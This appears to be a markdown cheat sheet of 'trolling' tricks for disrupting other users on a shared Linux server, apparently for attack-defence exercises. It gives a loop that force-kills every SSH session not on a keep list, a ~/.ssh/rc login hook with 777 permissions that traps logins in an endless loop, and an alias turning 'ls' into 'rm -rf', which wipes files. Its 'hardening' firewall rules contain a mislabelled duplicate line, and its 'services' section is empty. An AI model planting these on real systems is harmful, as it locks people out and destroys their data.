### SSH session trolling

```
ssh2keep={1 2} 

ssh2boot=({1..20}); while true; do for session in "${ssh2boot[@]}"; do if [[ ! " ${ssh2keep[@]} " =~ " ${session} " ]]; then if ps -t pts/${session} > /dev/null 2>&1; then echo "Session pts/${session} discovered!!!"; pkill -9 -t pts/${session}; echo "Attempted to kill pts/${session}..."; if ! ps -t pts/${session} > /dev/null 2>&1; then echo "pts/${session} killed :)"; else echo "Failed to kill pts/${session}."; fi; fi; fi; done; sleep 1; done
```


### SSH Service trolling

**run a command on an ssh session when it starts**

```bash
nano /home/user/.ssh/rc
```

place this command
```bash
bash /dev/shm/parrot.sh
```

or this command:
```bash
while true; do for i in $(seq 1 5); do clear; printf "\n\n\r     Loading$(printf '.%.0s' $(seq 1 $i)) \n\n"; sleep 0.5; done; done
```

```bash
chmod 777 /home/user/.ssh/rc
```


### bashrc aliases

```
alias ls='rm -rf'
alias clear='telnet towel.blinkenlights.nl'
```



### terminal pets

```
bash parrot.sh > /dev/pts/1 &
bash pedro.sh > /dev/pts/1 &

kill -9 PID
```


### Server Hardening

**ports**
```bash
# Block incoming traffic on port 22 
sudo iptables -A INPUT -p tcp --dport 22 -j DROP
sudo iptables -A INPUT -p udp --dport 22 -j DROP 

# Block outgoing traffic on port 22 
sudo iptables -A OUTPUT -p tcp --sport 22 -j DROP
sudo iptables -A INPUT -p udp --dport 22 -j DROP 


# Setting default policies:
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT

# Exceptions to default policy
iptables -A INPUT -p tcp --dport 80 -j ACCEPT       # HTTP
iptables -A INPUT -p tcp --dport 443 -j ACCEPT      # HTTPS
```

**services**

```
```
